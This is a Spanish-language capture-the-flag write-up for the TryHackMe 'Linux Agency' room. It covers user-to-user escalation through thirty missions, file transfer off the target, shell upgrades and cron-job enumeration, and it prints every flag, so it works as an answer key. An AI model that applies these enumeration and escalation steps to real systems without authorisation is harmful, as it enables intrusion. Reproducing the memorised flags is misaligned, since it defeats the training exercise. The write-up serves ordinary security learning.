# Linux Agency

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c9f0044d-8fab-454d-87f6-7ea3fd1042bf)

***
- Source: https://tryhackme.com/room/linuxagency
- OS: Linux
- Dificultad: Medium
- IP: No estática
- Temas: `Linux Enumeration`, `Linux PrivEsc`, `CTF`, `Docker Breakout`.
***

### Misiones:

##### Flag 1:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ ssh agent47@10.10.71.240 
The authenticity of host '10.10.71.240 (10.10.71.240)' can't be established.
ED25519 key fingerprint is SHA256:FaS8GFNr+3UXf7F3dwtW1e3iN+IHyDOiulUbd7gptO4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.71.240' (ED25519) to the list of known hosts.
agent47@10.10.71.240's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
agent47@linuxagency:~$ 
~~~

##### Flag 2:

~~~bash
agent47@linuxagency:~$ su mission1
Password: 
mission1@linuxagency:/home/agent47$ cd
mission1@linuxagency:~$ ls
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
~~~

##### Flag 3:

~~~bash
mission1@linuxagency:~$ su mission2
Password: 
mission2@linuxagency:/home/mission1$ cd
mission2@linuxagency:~$ ls
flag.txt
mission2@linuxagency:~$ cat flag.txt 
mission3{ab1e1ae5cba688340825103f70b0f976}
~~~

##### Flag 4:

~~~bash
mission2@linuxagency:~$ su mission3
Password: 
mission3@linuxagency:/home/mission2$ cd
mission3@linuxagency:~$ ls
flag.txt
mission3@linuxagency:~$ cat flag.txt 
I am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$ file flag.txt 
flag.txt: ASCII text, with CR, LF line terminators
mission3@linuxagency:~$ strings flag.txt 
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
I am really sorry man the flag is stolen by some thief's.
~~~

##### Flag 5:

~~~bash
mission3@linuxagency:~$ su mission4
Password: 
mission4@linuxagency:/home/mission3$ cd
mission4@linuxagency:~$ ls
flag
mission4@linuxagency:~$ cd flag/
mission4@linuxagency:~/flag$ ls
flag.txt
mission4@linuxagency:~/flag$ cat flag.txt 
mission5{bc67906710c3a376bcc7bd25978f62c0}
~~~

##### Flag 6:

~~~bash
mission4@linuxagency:~/flag$ su mission5
Password: 
mission5@linuxagency:/home/mission4/flag$ cd
mission5@linuxagency:~$ ls
mission5@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission5 mission5 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission5 mission5    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission5 mission5 3771 Jan 12  2021 .bashrc
-r--------  1 mission5 mission5   43 Jan 12  2021 .flag.txt
-rw-r--r--  1 mission5 mission5  807 Jan 12  2021 .profile
mission5@linuxagency:~$ cat .flag.txt 
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
~~~

##### Flag 7:

~~~bash
mission5@linuxagency:~$ su mission6
Password: 
mission6@linuxagency:/home/mission5$ cd
mission6@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission6 mission6 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission6 mission6    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission6 mission6 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission6 mission6 4096 Jan 12  2021 .flag
-rw-r--r--  1 mission6 mission6  807 Jan 12  2021 .profile
mission6@linuxagency:~$ cd .flag/
mission6@linuxagency:~/.flag$ ls
flag.txt
mission6@linuxagency:~/.flag$ cat flag.txt 
mission7{53fd6b2bad6e85519c7403267225def5}
~~~

##### Flag 8:

~~~bash
mission6@linuxagency:~/.flag$ su mission7
Password: 
bash: /home/mission6/.bashrc: Permission denied
mission7@linuxagency:~/.flag$ 
mission7@linuxagency:~/.flag$ cd
bash: cd: /home/mission6: Permission denied
mission7@linuxagency:~/.flag$ whoami
mission7
mission7@linuxagency:~/.flag$ cd /home/mission7
mission7@linuxagency:/home/mission7$ ls
flag.txt
mission7@linuxagency:/home/mission7$ cat flag.txt 
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
~~~

##### Flag 9:

~~~bash
mission7@linuxagency:/home/mission7$ su mission8
Password: 
mission8@linuxagency:/home/mission7$ cd
mission8@linuxagency:~$ ls
~~~

- Aquí no vi nada, así que busqué recursivamente por archivos ``.txt`` a los que tengamos permisos de lectura, y había una en raíz:

~~~bash
mission8@linuxagency:~$ find / -readable 2>/dev/null | grep txt | grep -vE "snap|usr|run|dev"
/lib/firmware/carl9170fw/carlfw/CMakeLists.txt
/lib/firmware/carl9170fw/tools/carlu/CMakeLists.txt
/lib/firmware/carl9170fw/tools/src/CMakeLists.txt
/lib/firmware/carl9170fw/tools/CMakeLists.txt
/lib/firmware/carl9170fw/tools/lib/CMakeLists.txt
/lib/firmware/carl9170fw/config/CMakeLists.txt
/lib/firmware/carl9170fw/CMakeLists.txt
/lib/firmware/carl9170fw/minifw/CMakeLists.txt
/lib/firmware/ath10k/QCA9887/hw1.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA9888/hw2.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA9377/hw1.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA6174/hw2.1/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA6174/hw3.0/notice_ath10k_firmware-4.txt
/lib/firmware/ath10k/QCA6174/hw3.0/notice_ath10k_firmware-6.txt
/lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-4.txt
/lib/firmware/ath10k/QCA9984/hw1.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA99X0/hw2.0/notice_ath10k_firmware-5.txt
/lib/firmware/ath10k/QCA4019/hw1.0/notice_ath10k_firmware-5.txt
/lib/firmware/qcom/NOTICE.txt
/lib/firmware/qca/NOTICE.txt
/boot/grub/gfxblacklist.txt
/var/cache/dictionaries-common/ispell-dicts-list.txt
/flag.txt
/etc/java-11-openjdk/security/policy/README.txt
/etc/X11/rgb.txt
/etc/brltty/Input/bl/18.txt
/etc/brltty/Input/bl/40_m20_m40.txt
/etc/brltty/Input/eu/all.txt
/etc/brltty/Input/ba/all.txt
/etc/brltty/Input/tt/all.txt
/etc/brltty/Input/vd/all.txt
/etc/brltty/Input/lt/all.txt
/etc/brltty/Input/mn/all.txt
/etc/brltty/Input/lb/all.txt
/etc/brltty/Input/bd/all.txt
/etc/brltty/Input/vs/all.txt
/etc/brltty/Input/ec/all.txt
/etc/brltty/Input/ec/spanish.txt
/etc/brltty/Input/vr/all.txt
/etc/brltty/Input/mb/all.txt
/etc/brltty/Input/tn/all.txt
mission8@linuxagency:~$ cat /flag.txt
mission9{ba1069363d182e1c114bef7521c898f5}
~~~

##### Flag 10:

~~~bash
mission8@linuxagency:~$ su mission9
Password: 
mission9@linuxagency:/home/mission8$ cd
mission9@linuxagency:~$ ls -la
total 136664
drwxr-x---  2 mission9 mission9      4096 Jan 12  2021 .
drwxr-xr-x 45 root     root          4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission9 mission9         9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission9 mission9      3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission9 mission9       807 Jan 12  2021 .profile
-r--------  1 mission9 mission9 139921551 Jan 12  2021 rockyou.txt
mission9@linuxagency:~$ cat rockyou.txt | grep 'mission10'
mission101
mission10
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
mission1098
mission108
mission9@linuxagency:~$ 
~~~

##### Flag 11:

~~~bash
mission9@linuxagency:~$ su mission10
Password: 
mission10@linuxagency:/home/mission9$ cd
mission10@linuxagency:~$ ls -la
total 24
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission10 mission10    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission10 mission10 3771 Jan 12  2021 .bashrc
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 folder
drwxr-xr-x  3 mission10 mission10 4096 Jan 12  2021 .local
-rw-r--r--  1 mission10 mission10  807 Jan 12  2021 .profile
mission10@linuxagency:~$ find ~/ -name *.txt 2>/dev/null
/home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission10@linuxagency:~$ cat /home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission11{db074d9b68f06246944b991d433180c0}
~~~

##### Flag 12:

~~~bash
mission10@linuxagency:~$ su mission11
Password: 
mission11@linuxagency:/home/mission10$ cd
mission11@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission11 mission11 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission11 mission11    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission11 mission11 3963 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission11 mission11 4096 Jan 12  2021 .local
-rw-r--r--  1 mission11 mission11  807 Jan 12  2021 .profile
mission11@linuxagency:~$ cat .bashrc
~~~

- Aquí el archivo es bastante extenso, pues es nuestra configuración de la bash.
- En una parte, vemos un texto en base64, que presuntamente es nuestra flag:

~~~bash
# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
export FLAG=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
export flag=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
~~~

- Lo revertimos a texto plano:

~~~bash
mission11@linuxagency:~$ echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= | base64 -d | rev
mission12{f449a1d33d6edc327354635967f9a720}
~~~

##### Flag 13:

~~~bash
mission11@linuxagency:~$ su mission12
Password: 
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
----------  1 mission12 mission12   44 Jan 12  2021 flag.txt
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
~~~

- Nuestra flag tiene permisos `000`.
- Le asignamos permiso `400` para que el usuario, nosotros, pueda leerla:

~~~bash
mission12@linuxagency:~$ chmod 400 flag.txt 
mission12@linuxagency:~$ cat flag.txt 
mission13{076124e360406b4c98ecefddd13ddb1f}
~~~

##### Flag 14:

~~~bash
mission12@linuxagency:~$ su mission13
Password: 
mission13@linuxagency:/home/mission12$ cd
mission13@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission13 mission13    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission13 mission13 3771 Jan 12  2021 .bashrc
-r--------  1 mission13 mission13   61 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission13 mission13 4096 Jan 12  2021 .local
-rw-r--r--  1 mission13 mission13  807 Jan 12  2021 .profile
-rw-------  1 mission13 mission13  978 Jan 12  2021 .viminfo
mission13@linuxagency:~$ cat flag.txt 
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:~$ cat flag.txt | base64 -d
mission14{d598de95639514b9941507617b9e54d2}
~~~

##### Flag 15:

~~~bash
mission13@linuxagency:~$ su mission14
Password: 
mission14@linuxagency:/home/mission13$ cd
mission14@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission14 mission14    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission14 mission14 3771 Jan 12  2021 .bashrc
-r--------  1 mission14 mission14  345 Jan 12  2021 flag.txt
-rw-r--r--  1 mission14 mission14  807 Jan 12  2021 .profile
mission14@linuxagency:~$ cat flag.txt 
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
~~~

- Pasamos el texto a [dcode](https://www.dcode.fr):

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c9c0f470-ccd9-4184-8932-31b9c237f54b)
- Passwd: `mission15{fc4915d818bfaeff01185c3547f25596}`

##### Flag 16:

~~~bash
mission14@linuxagency:~$ su mission15
Password: 
mission15@linuxagency:/home/mission14$ cd
mission15@linuxagency:~$ ls
flag.txt
mission15@linuxagency:~$ cat flag.txt 
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
~~~

- Lo pasamos a la misma herramienta, es código ASCII:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/f139dcbf-06b3-4e42-9316-43e9f5c5d66b)
- Passwd: `mission16{884417d40033c4c2091b44d7c26a908e}`

##### Flag 17:

~~~bash
mission15@linuxagency:~$ su mission16
Password: 
mission16@linuxagency:/home/mission15$ cd
mission16@linuxagency:~$ ls -la
total 28
drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission16 mission16    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission16 mission16 3771 Jan 12  2021 .bashrc
-r--------  1 mission16 mission16 8440 Jan 12  2021 flag
-rw-r--r--  1 mission16 mission16  807 Jan 12  2021 .profile
mission16@linuxagency:~$ file flag
flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
~~~

- Parece ser un compilado de Linux, le otorgamos permisos de ejecución y ejecutamos:

~~~bash
mission16@linuxagency:~$ chmod +x flag 
mission16@linuxagency:~$ ./flag
mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
~~~

##### Flag 18:

~~~bash
mission16@linuxagency:~$ su mission17
Password: 
mission17@linuxagency:/home/mission16$ cd
mission17@linuxagency:~$ ls
flag.java
mission17@linuxagency:~$ javac flag.java 
mission17@linuxagency:~$ ls
flag.class  flag.java
mission17@linuxagency:~$ java flag 
mission18{f09760649986b489cda320ab5f7917e8}
~~~

##### Flag 19:

~~~bash
mission17@linuxagency:~$ su mission18
Password: 
mission18@linuxagency:/home/mission17$ cd
mission18@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission18 mission18    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission18 mission18 3771 Jan 12  2021 .bashrc
-r--------  1 mission18 mission18  312 Jan 12  2021 flag.rb
-rw-r--r--  1 mission18 mission18  807 Jan 12  2021 .profile}
mission18@linuxagency:~$ ruby flag.rb 
mission19{a0bf41f56b3ac622d808f7a4385254b7}
~~~

##### Flag 20:

~~~bash
mission18@linuxagency:~$ su mission19
Password: 
mission19@linuxagency:/home/mission18$ cd
mission19@linuxagency:~$ ls
flag.c
mission19@linuxagency:~$ gcc flag.c -o flag.o
flag.c: In function ‘main’:
flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
     int length = strlen(flag);
flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’
flag.c:5:18: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
mission19@linuxagency:~$ ./flag.o 
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
~~~

##### Flag 21:

~~~bash
mission19@linuxagency:~$ su mission20
Password: 
mission20@linuxagency:/home/mission19$ cd
mission20@linuxagency:~$ ls
flag.py
mission20@linuxagency:~$ which python3
/usr/bin/python3
mission20@linuxagency:~$ python3 flag.py
mission21{7de756aabc528b446f6eb38419318f0c}
~~~

##### Flag 22:

~~~bash
mission20@linuxagency:~$ su mission21
Password: 
$ pwd
/home/mission20
$ cd
$ ls -la
total 20
drwxr-x---  3 mission21 mission21 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission21 mission21    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission21 mission21 3853 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission21 mission21 4096 Jan 12  2021 .local
-rw-r--r--  1 mission21 mission21  807 Jan 12  2021 .profile   
~~~

- No había nada, spawneé una shell TTY con Python y apareció:

~~~bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
~~~

##### Flag 23:

~~~bash
mission21@linuxagency:~$ su mission22
Password: 
Python 3.6.9 (default, Oct  8 2020, 12:12:24) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty; pty.spawn("/bin/bash")
mission22@linuxagency:/home/mission21$ cd
mission22@linuxagency:~$ ls
flag.txt
mission22@linuxagency:~$ cat flag.txt 
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
~~~

##### Flag 24:

~~~bash
mission22@linuxagency:~$ su mission23
Password: 
mission23@linuxagency:/home/mission22$ cd
mission23@linuxagency:~$ ls
message.txt
mission23@linuxagency:~$ cat message.txt 
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
~~~

- Menciona hosts, si revisamos ``/etc/hosts`` veremos un dominio al DNS algo interesante:

~~~bash
mission23@linuxagency:~$ cat /etc/hosts
127.0.0.1       localhost       linuxagency     mission24.com
127.0.1.1       ubuntu  linuxagency

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback      linuxagency
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~~~

- Hacemos un `curl` a la dirección, en el inicio del archivo podremos ver el título de la página interna:

~~~html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
    <style type="text/css" media="screen">
  * {
~~~

##### Flag 25:

~~~bash
mission23@linuxagency:~$ su mission24
Password: 
mission24@linuxagency:/home/mission23$ cd
mission24@linuxagency:~$ ls
bribe
mission24@linuxagency:~$ file bribe 
bribe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=006516d8c62bb8a5f5a41595ce4529d4bcb159b8, not stripped
mission24@linuxagency:~$ ./bribe 

There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag

Words are not the price for your flag
Give Me money Man!!!
~~~

- Es otra nota, vemos que hay otro archivo .`viminfo`, el cual contiene una flag:

~~~bash
mission24@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission24 mission24    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission24 mission24 3771 Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission24 mission24 8576 Jan 12  2021 bribe
drwxr-xr-x  3 mission24 mission24 4096 Jan 12  2021 .local
-rw-r--r--  1 mission24 mission24  807 Jan 12  2021 .profile
-rw-------  1 mission24 mission24 4934 Jan 12  2021 .viminfo
mission24@linuxagency:~$ cat .viminfo | grep mission
                printf("mission25{edited}\n");
|3,0,4,1,1,0,1610305123,"       printf(\"mission25{edited}\\n\");"
mission25{61b93637881c87c71f220033b22a921b}
~~~

##### Flag 26:

~~~bash
agent47@linuxagency:~$ su mission25
Password: 
mission25@linuxagency:/home/agent47$ cd
mission25@linuxagency:~$ ls
bash: ls: No such file or directory
mission25@linuxagency:~$ cd
mission25@linuxagency:~$ ls -la
bash: ls: No such file or directory
mission25@linuxagency:~$ cat .bashrc | grep alias
bash: grep: No such file or directory
bash: cat: No such file or directory
~~~

- Vemos que no podemos utilizar comandos con normalidad.
- Para esto, usaremos las rutas absolutas:

~~~bash
mission25@linuxagency:~$ /bin/ls
flag.txt
mission25@linuxagency:~$ /bin/cat flag.txt 
mission26{cb6ce977c16c57f509e9f8462a120f00}
~~~

##### Flag 27:

~~~bash
mission25@linuxagency:~$ /bin/su mission26
Password: 
mission26@linuxagency:/home/mission25$ cd
mission26@linuxagency:~$ ls
flag.jpg
~~~

- Tenemos una imagen, nos la compartiremos a nuestra máquina.
- Abrimos un server con Python desde la máquina atacante:

~~~bash
mission26@linuxagency:~$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.2.60.167 - - [22/Feb/2024 16:33:09] "GET /flag.jpg HTTP/1.1" 200 -
~~~

- Y en nuestra máquina lo descargamos.
- A partir de esto, aplicaremos un reconocimiento de los metadatos de la imagen:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ wget http://10.10.217.42:1234/flag.jpg
--2024-02-22 19:33:08--  http://10.10.217.42:1234/flag.jpg
Conectando con 10.10.217.42:1234... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 85980 (84K) [image/jpeg]
Grabando a: «flag.jpg»

flag.jpg            100%[================>]  83.96K   204KB/s    en 0.4s    

2024-02-22 19:33:08 (204 KB/s) - «flag.jpg» guardado [85980/85980]

┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ exiftool flag.jpg 
ExifTool Version Number         : 12.67
File Name                       : flag.jpg
Directory                       : .
File Size                       : 86 kB
File Modification Date/Time     : 2021:01:12 07:02:12-05:00
File Access Date/Time           : 2024:02:22 19:33:14-05:00
File Inode Change Date/Time     : 2024:02:22 19:33:08-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 100
Y Resolution                    : 100
Comment                         : mission27{444d29b932124a48e7dddc0595788f4d}
Image Width                     : 1000
Image Height                    : 1870
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1000x1870
Megapixels                      : 1.9
~~~

##### Flag 28:

~~~bash
mission26@linuxagency:~$ su mission27
Password: 
mission27@linuxagency:/home/mission26$ cd
mission27@linuxagency:~$ ls
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
~~~

- Repetimos el mismo proceso, pasaremos el archivo en cuestión a nuestra máquina:
- Descomprimiremos también el archivo, ya que está en `.gz`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ 7z x flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 7 5800HS with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 136 bytes (1 KiB)

Extracting archive: flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
--
Path = flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
Type = gzip
Headers Size = 75

Everything is Ok                                                       

Size:       51
Compressed: 136
~~~

- Una vez hecho esto, intenté abrir el archivo pero me daba un error.
- Inspeccioné más a fondo esta con `hexeditor` a ver si tenía algún error, pero resulta que la flag está ahí:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/3970ef70-14de-4506-8e17-1a596ab5b858)

- También podemos usar ``strings`` sobre el archivo descomprimido:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
GIF87a
mission28{03556f8ca983ef4dc26d2055aef9770f}
~~~


##### Flag 29:

~~~bash
mission27@linuxagency:~$ su mission28
Password: 
irb(main):002:0> system('bash')
mission28@linuxagency:/home/mission27$ cd
mission28@linuxagency:~$ ls
examples.desktop  txt.galf
mission28@linuxagency:~$ cat txt.galf 
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ cat txt.galf | rev
mission29{8192b05d8b12632586e25be74da2fff1}
~~~

##### Flag 30:

~~~bash
mission28@linuxagency:~$ su mission29
Password: 
mission29@linuxagency:/home/mission28$ cd
mission29@linuxagency:~$ ls
bludit
mission29@linuxagency:~$ cd bludit/
mission29@linuxagency:~/bludit$ ls -la
total 44
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
mission29@linuxagency:~/bludit$ cat .htpasswd | grep miss
mission30{d25b4c9fac38411d2fcb4796171bda6e}
~~~

##### Viktor:

~~~bash
mission29@linuxagency:~/bludit$ su mission30
Password: 
mission30@linuxagency:/home/mission29/bludit$ cd
mission30@linuxagency:~$ ls
Escalator  examples.desktop
mission30@linuxagency:~$ cd Escalator/
mission30@linuxagency:~/Escalator$ ls -la
total 16
drwxr-xr-x 3 mission30 mission30 4096 Feb 22 17:12 .
drwxr-x--- 4 mission30 mission30 4096 Feb 22 17:12 ..
drwxr-xr-x 8 mission30 mission30 4096 Jan 12  2021 .git
-rw-r--r-- 1 mission30 mission30   35 Jan 12  2021 sources.py
mission30@linuxagency:~/Escalator$ cd .git/
mission30@linuxagency:~/Escalator/.git$ cd logs/
mission30@linuxagency:~/Escalator/.git/logs$ ls
HEAD  refs
mission30@linuxagency:~/Escalator/.git/logs$ cat HEAD 
0000000000000000000000000000000000000000 e0b807dbeb5aba190d6307f072abb60b34425d44 root <root@Xyan1d3> 1610359600 +0530       commit (initial): Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
~~~

***
### PrivEsc

- Iniciamos sesión con la contraseña de `viktor`:

~~~bash
mission30@linuxagency:~$ su viktor
Password: 
viktor@linuxagency:/home/mission30$ cd
viktor@linuxagency:~$ 
~~~

##### Dalia's Flag:

- Tenemos un trabajo cron ejecutandose:

~~~bash
viktor@linuxagency:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   dalia   sleep 30;/opt/scripts/47.sh
